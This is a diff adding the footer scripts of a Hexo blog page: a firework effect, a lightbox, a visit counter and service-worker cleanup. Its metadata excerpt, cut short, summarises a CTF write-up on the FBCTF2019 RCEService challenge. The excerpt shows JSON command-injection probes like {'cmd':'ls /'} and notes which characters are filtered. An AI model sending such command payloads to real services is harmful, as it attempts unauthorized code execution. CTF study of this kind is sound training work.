+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "fuboy",
+          title: "[FBCTF2019]RCEService",
+          url: "http://example.com/2025/03/30/[FBCTF2019]RCEService/",
+          excerpt: "",
+          description: "",
+          stripContent: "   题目界面如上 它说需要我们传入一个json格式的命令 我们传入 &amp;#123;&amp;quot;cmd&amp;quot;:&amp;quot;ls&amp;quot;&amp;#125; 回显出来了index.php 但当我们传入 &amp;#123;&amp;quot;cmd&amp;quot;:&amp;quot;ls /&amp;quot;&amp;#125; 发现&amp;#x2F;被过滤了 经过多次尝试，发现好多符号都被过滤了 没办法了，看题解 题解说这题是有源码的…我没找到…题目的问题 题目源码： 123456789101112131415161718192021&amp;lt",
+          date: "Sun Mar 30 2025 20:05:21 GMT+0800",
+          updated: "Tue Apr 08 2025 23:40:34 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
